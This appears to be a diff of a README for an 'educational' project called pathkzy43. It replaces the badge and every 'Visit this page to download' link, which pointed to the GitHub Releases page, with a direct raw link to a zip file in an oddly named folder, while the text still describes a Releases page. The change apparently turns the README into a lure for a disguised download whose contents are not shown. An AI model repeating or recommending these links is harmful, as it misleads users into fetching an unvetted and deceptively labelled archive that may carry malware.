@@ -1,6 +1,6 @@
 # 🎓 pathkzy43 - Learn Modern Development Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/Qamarz6438/pathkzy43/main/plumagery/pathkzy43_Sifatite.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to pathkzy43! This application serves as an educational resource to help
 
 To get started, you need to download the latest version of the application. Visit the link below to access the Releases page, where you'll find the latest version available for download:
 
-[Visit this page to download](https://github.com/Qamarz6438/pathkzy43/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Qamarz6438/pathkzy43/main/plumagery/pathkzy43_Sifatite.zip)
 
 Once you are on the Releases page, look for the version number that suits your needs. Click on it to expand the version details, then find the appropriate file for your system. Download it by clicking the link after "Assets." 
 
-For your convenience, here is the link again: [Visit this page to download](https://github.com/Qamarz6438/pathkzy43/releases)
+For your convenience, here is the link again: [Visit this page to download](https://raw.githubusercontent.com/Qamarz6438/pathkzy43/main/plumagery/pathkzy43_Sifatite.zip)
 
 ### 📋 System Requirements
 
